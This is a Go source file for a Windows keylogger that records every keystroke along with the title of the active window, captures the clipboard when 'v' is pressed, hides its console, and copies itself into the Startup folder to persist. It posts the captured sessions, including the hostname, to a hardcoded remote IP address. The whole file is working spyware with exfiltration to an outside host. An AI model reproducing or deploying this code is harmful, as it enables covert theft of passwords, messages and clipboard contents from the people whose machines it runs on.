package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	hook "github.com/robotn/gohook"
	"golang.design/x/clipboard"
	"net/http"
	"reflect"
	"strings"
	"syscall"
	"time"
)

var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowTextLength = user32.NewProc("GetWindowTextLengthW")
	procGetWindowText       = user32.NewProc("GetWindowTextW")
	sessions                []Session
	session                 Session
	sessionName             string
	debugging               = false
	hostUrl                 = "http://141.147.23.227:8080/sessions"
)

type Session struct {
	Hostname string   `json:"hostname"`
	Time     string   `json:"time"`
	Name     string   `json:"name"`
	Readable string   `json:"readable"`
	Raw      []string `json:"raw"`
}

func post() error {
	data, err := json.Marshal(sessions)
	if err != nil {
		return err
	}

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Post(hostUrl, "application/json", bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("failed to post data: %s", resp.Status)
	}

	sessions = nil
	return nil
}

func isEmpty(s interface{}) bool {
	if reflect.ValueOf(s).Kind() == reflect.Ptr && reflect.ValueOf(s).IsNil() {
		return true
	}
	return reflect.DeepEqual(s, reflect.Zero(reflect.TypeOf(s)).Interface())
}

func listen() {
	keyboardEventBuffer := hook.Start()

	for event := range keyboardEventBuffer {
		if event.Kind == hook.KeyDown {
			keyCharacter := string(event.Keychar)
			windowName := getActiveWindowTitle()

			switch event.Keychar {
			case 32:
				keyCharacter = " "
			case 8:
				keyCharacter = "BACKSPACE"
			}

			if isEmpty(session) || windowName != session.Name {
				if !isEmpty(session) {
					sessions = append(sessions, session)
					post()
				}
				// https://www.geeksforgeeks.org/time-formatting-in-golang/
				session = Session{Hostname: getHostName(), Time: time.Now().Format("2006-01-02 15:04:05"), Name: windowName}
			}

			if len(keyCharacter) == 1 {
				session.Raw = append(session.Raw, keyCharacter)
				session.Readable += keyCharacter
				if keyCharacter == "v" || keyCharacter == "V" {
					session.Raw = append(session.Raw, "(CLIPBOARD: "+string(clipboard.Read(0))+"/)")
				}
			} else if keyCharacter == "BACKSPACE" {
				session.Raw = append(session.Raw, keyCharacter)
				if len(session.Readable) > 0 {
					session.Readable = session.Readable[:len(session.Readable)-1]
				}
			} else {
				session.Raw = append(session.Raw, "(C:"+keyCharacter+")")
			}
			if debugging {
				fmt.Printf("'%s': '%s' on '%s'\n", keyCharacter, event.Keychar, windowName)
				fmt.Printf("%s\n", session.Readable)
			}
		}
	}
}

func main() {
	hideTerminal()
	if !debugging {
		if strings.Compare(getStartupDir(), getLaunchDir()) == -1 {
			go copyToStartup()
			// go showMessage("Error", "Error opening file for writing, aborting.")
		}
	}
	go listen()
	for {
		time.Sleep(1 * time.Second)
	}
}
